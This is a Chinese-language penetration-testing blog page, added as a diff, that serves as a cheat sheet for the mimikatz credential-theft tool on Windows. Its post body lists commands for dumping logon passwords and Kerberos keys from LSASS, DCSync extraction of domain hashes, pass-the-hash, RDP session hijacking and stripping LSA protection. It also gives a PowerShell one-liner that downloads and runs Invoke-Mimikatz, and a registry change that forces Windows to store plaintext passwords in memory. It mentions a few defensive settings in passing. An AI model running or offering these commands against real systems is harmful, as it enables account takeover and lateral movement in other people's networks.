@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="神器mimikatz">
+<meta property="og:url" content="http://yoursite.com/2018/03/10/神器mimikatz/index.html">
+<meta property="og:site_name" content="WBGlIl">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/07/21/5d34862d0f48d67283.jpg">
+<meta property="og:updated_time" content="2019-07-21T15:46:15.926Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="神器mimikatz">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/21/5d34862d0f48d67283.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/10/神器mimikatz/">
+
+
+
+
+
+  <title>神器mimikatz | WBGlIl</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WBGlIl</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/10/神器mimikatz/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="WBGlIl">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WBGlIl">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">神器mimikatz</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-03-10T12:02:44+08:00">
+                2018-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.loli.net/2019/07/21/5d34862d0f48d67283.jpg" alt></p>
+<a id="more"></a>
+<p>Mimikatz 是从 Windows 系统中收集凭证数据最好的工具之一。事实上，我个人认为 Mimikatz 是收集 Windows 系统凭证数据的“瑞士军刀”（多个利器的集合）<br>一个可以做任何事情的工具。由于 Mimikatz 的作者 Benjamin Delpy 是法国人，所以描述关于 Mimikatz 用法的资源都是法语的，至少在他的博客中是这样的<br>Mimikatz 的 GitHub 页面是英文的，包括了命令的用法等有用信息。<br>Mimikatz 是 Benjamin Delpy (@gentilkiwi) 在 2007 年使用 C 语言编写的一个 Windows x32/x64 程序，用于了解更多关于 Windows 的凭据数据（并作为 POC）<br>有两个可选的组件能提供一些额外的功能，mimidrv（与 Windows 内核交互的驱动程序）和 mimilib（绕过 AppLocker，验证包/SSP，密码过滤器以及用于 WinDBG 的 sekurlsa）  </p>
+<p>在用户登录之后，会生成很多凭证数据并存储在本地安全权限服务的进程（LSASS）内存中。其目的是为了方便单点登录（SSO）在每次对资源进行访问请求时确保用户不会被提示。凭证数据包括 NTLM 密码哈希，LM 密码哈希（如果密码长度小于 15 个字符），甚至明文密码（以支持其他的 WDigest 和 SSP 认证）。虽然可以阻止 Windows 创建 LM 哈希到本地计算机的 SAM 数据库（或 AD 数据库），但这并不能阻止系统在内存中生成 LM 哈希。默认情况下，在 Windows Server 2008 和 Windows Vista 中不再生成用户的 LM 哈希，除非明确的启用了该功能。从 Windows 8.1 和 Windows Server 2012 R2 开始，LM 哈希和“纯文本”密码将不在内存中生成。此功能也被“移植”到了较早版本的 Windows 中，Windows 7/8/2008 R2/2012 需要打 kb2871997 补丁。为了防止在 LSASS 进程中放置“明文”密码，下面的注册表键被设置为0需要修改为1  </p>
+<pre>
+<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest 'UseLogonCredential'(DWORD)</code>
+</pre>
+<p>exe<br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a><br>powershell<br><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</a></p>
+<h1 id="exe版使用"><a href="#exe版使用" class="headerlink" title="exe版使用"></a>exe版使用</h1><!--more-->
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">提升权限</span><br><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">清屏</span><br><span class="line">cls</span><br><span class="line"></span><br><span class="line">日志</span><br><span class="line">log</span><br><span class="line">将所有输出记录到文件mimikatz.log默认情况下</span><br><span class="line"></span><br><span class="line">退出</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">查看mimikatz的版本</span><br><span class="line">version</span><br><span class="line"></span><br><span class="line">查看当前登录的系统用户</span><br><span class="line">system::user</span><br><span class="line"></span><br><span class="line">查看计算机名称</span><br><span class="line">system::computer</span><br><span class="line"></span><br><span class="line">列出进程</span><br><span class="line">process::list</span><br><span class="line"></span><br><span class="line">暂停进程</span><br><span class="line">process::suspend 进程名称</span><br><span class="line"></span><br><span class="line">结束进程</span><br><span class="line">process::stop 进程名称</span><br><span class="line"></span><br><span class="line">列出系统的核心模块及所在位置</span><br><span class="line">process::modules</span><br><span class="line"></span><br><span class="line">列出系统的服务</span><br><span class="line">service::list</span><br><span class="line"></span><br><span class="line">移除系统的服务</span><br><span class="line">service::remove</span><br><span class="line"></span><br><span class="line">启动或停止服务</span><br><span class="line">service::start stop 服务名称</span><br><span class="line"></span><br><span class="line">列出权限列表</span><br><span class="line">privilege::list</span><br><span class="line"></span><br><span class="line">激活一个或多个权限</span><br><span class="line">privilege::enable</span><br><span class="line"></span><br><span class="line">打开系统的cmd.exe</span><br><span class="line">nogpo::cmd</span><br><span class="line"></span><br><span class="line">打开系统的注册表</span><br><span class="line">nogpo::regedit</span><br><span class="line"></span><br><span class="line">打开任务管理器</span><br><span class="line">nogpo::taskmgr</span><br><span class="line"></span><br><span class="line">显示所有会话id</span><br><span class="line">ts::sessions</span><br><span class="line"></span><br><span class="line">劫持rdp切换到别的的用户桌面会话</span><br><span class="line">ts::remote /id:</span><br><span class="line"></span><br><span class="line">显示进程和对应的pid情况等</span><br><span class="line">ts::processes</span><br><span class="line"></span><br><span class="line">dcsync直接从NTDS.DIT中检索密码</span><br><span class="line">lsadump::dcsync /domain:*** /all /csv</span><br><span class="line"></span><br><span class="line">使用/user参数指定域用户名，Mimikatz可以转储特定用户的所有帐户信息，包括其密码哈希</span><br><span class="line">lsadump::dcsync /domain:*** /user:test</span><br><span class="line"></span><br><span class="line">向 LSA Server 质询检索 SAM/AD 的数据</span><br><span class="line">"privilege::debug" "lsadump::lsa /inject"</span><br><span class="line"></span><br><span class="line">获取本地用户信息及密码</span><br><span class="line">sekurlsa::wdigest</span><br><span class="line"></span><br><span class="line">获取tspkg用户信息及密码</span><br><span class="line">sekurlsa::tspkg</span><br><span class="line"></span><br><span class="line">获登陆用户信息及密码</span><br><span class="line">sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">取消多用户远程登陆限制</span><br><span class="line">ts::multirdp</span><br><span class="line"></span><br><span class="line">列出 Kerberos 密钥</span><br><span class="line">SEKURLSA::Ekeys</span><br><span class="line"></span><br><span class="line">列出所有已通过认证的用户的 Kerberos 凭证（包括服务帐户和计算机帐户）</span><br><span class="line">SEKURLSA::Kerberos</span><br><span class="line"></span><br><span class="line">获取域中 Kerberos 服务帐户（KRBTGT）的密码数据</span><br><span class="line">SEKURLSA::Krbtgt</span><br><span class="line"></span><br><span class="line">列出所有可用的提供者的凭据。这个命令通常会显示最近登录过的用户和最近登录过的计算机的凭证。</span><br><span class="line">SEKURLSA::LogonPasswords</span><br><span class="line"></span><br><span class="line">将获取到的信息保存到txt中</span><br><span class="line">mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords full"" exit &gt;&gt; log.txt</span><br><span class="line"></span><br><span class="line">在内网域渗透中知道用户名和哈希值但解密不了可以这样</span><br><span class="line">使用NTLM hash远程连接</span><br><span class="line">mimikatz "privilege::debug" "sekurlsa::pth /user:*** /domain:*** /ntlm:***"</span><br><span class="line">"/run:mstsc.exe /restrictedadmin"</span><br><span class="line">"/run:cmd"</span><br><span class="line">默认为运行cmd</span><br><span class="line">dir \\ip\c$</span><br><span class="line"></span><br><span class="line">启用LSA保护</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa设置注册表键的值为:RunAsPPL=dword:00000001</span><br><span class="line">创建一个新的 GPO 并浏览到 计算机配置—首选项－Windows设置。右键单击注册表—新建，然后单击注册表项。弹出新的注册表属性对话框。</span><br><span class="line">在配置单元列表中，单击HKEY_LOCAL_MACHINE在注册表键路径列表中浏览到SYSTEM\CurrentControlSet\Control\Lsa 在值名称框中,输入 RunAsPPL,在值类型框中单击 REG_DWORD ,在数值数据框中，输入 00000001,最后单击确定</span><br><span class="line">LSA 保护阻止了一个非受保护的进程与 LSASS 进行交互。但是 Mimikatz 仍然可以使用驱动程序绕过!+</span><br><span class="line"><span class="meta">Mimikatz#</span><span class="bash"> !+</span></span><br><span class="line"><span class="meta">Mimikatz#</span><span class="bash"> !processprotect /process:lsass.exe /remove</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="powershell使用"><a href="#powershell使用" class="headerlink" title="powershell使用"></a>powershell使用</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set-executionpolicy remotesigned 取消执行限制</span><br><span class="line"></span><br><span class="line">powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"</span><br><span class="line">或</span><br><span class="line">Import-Module .\Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>
+
+<h1 id="在windows2012和windows8下Mimikatz无法显示明文"><a href="#在windows2012和windows8下Mimikatz无法显示明文" class="headerlink" title="在windows2012和windows8下Mimikatz无法显示明文"></a>在windows2012和windows8下Mimikatz无法显示明文</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">原因KB2871997补丁</span><br><span class="line">更新KB2871997补丁后，可禁用Wdigest Auth强制系统的内存不保存明文口令，此时mimikatz和wce均无法获得系统的明文口令。</span><br><span class="line">但是其他一些系统服务(如IIS的SSO身份验证)在运行的过程中需要Wdigest Auth开启，所以补丁采取了折中的办法——安装补丁后可选择是否禁用Wdigest Auth。</span><br><span class="line">当然，如果启用Wdigest Auth，内存中还是会保存系统的明文口令。</span><br><span class="line">方法:</span><br><span class="line">修改注册表——等待用户登陆抓取密码</span><br><span class="line"></span><br><span class="line">修改注册表开启UseLogonCredential</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br><span class="line"></span><br><span class="line">锁屏</span><br><span class="line">锁屏操作的快捷键为Win+L</span><br><span class="line">cmd下命令为:</span><br><span class="line">rundll32 user32.dll,LockWorkStation</span><br><span class="line"></span><br><span class="line">等用户下次再登录的时候,可抓到明文密码</span><br><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p>参考:<a href="https://wooyun.js.org/drops/Mimikatz%20非官方指南和命令参考_Part3.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/Mimikatz%20非官方指南和命令参考_Part3.html</a><br><a href="https://blog.csdn.net/qq_27446553/article/details/51745845" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/51745845</a><br><a href="http://www.91ri.org/15178.html" target="_blank" rel="noopener">http://www.91ri.org/15178.html</a><br><a href="http://www.91ri.org/15185.html" target="_blank" rel="noopener">http://www.91ri.org/15185.html</a><br>英文:<a href="https://adsecurity.org/?page_id=1821#MISCMemSSP" target="_blank" rel="noopener">https://adsecurity.org/?page_id=1821#MISCMemSSP</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透/" rel="tag"># 渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/09/windows提权常用命令/" rel="next" title="windows提权常用命令">
+                <i class="fa fa-chevron-left"></i> windows提权常用命令
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/30/git/" rel="prev" title="git基本使用">
+                git基本使用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="WBGlIl">
+            
+              <p class="site-author-name" itemprop="name">WBGlIl</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">39</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                大佬们的博客
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sariel.top/" title="只因不值得" target="_blank">只因不值得</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://422926799.github.io/" title="九世" target="_blank">九世</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.secist.com/" title="即刻安全" target="_blank">即刻安全</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nek0y4nsu.github.io/" title="Yansu" target="_blank">Yansu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blue-bird1.github.io/" title="青鸟" target="_blank">青鸟</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://qwq.moe/" title="蚊子の博客" target="_blank">蚊子の博客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://9bie.org/" title="biebie" target="_blank">biebie</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#exe版使用"><span class="nav-number">1.</span> <span class="nav-text">exe版使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#powershell使用"><span class="nav-number">2.</span> <span class="nav-text">powershell使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#在windows2012和windows8下Mimikatz无法显示明文"><span class="nav-number">3.</span> <span class="nav-text">在windows2012和windows8下Mimikatz无法显示明文</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WBGlIl</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
+
+
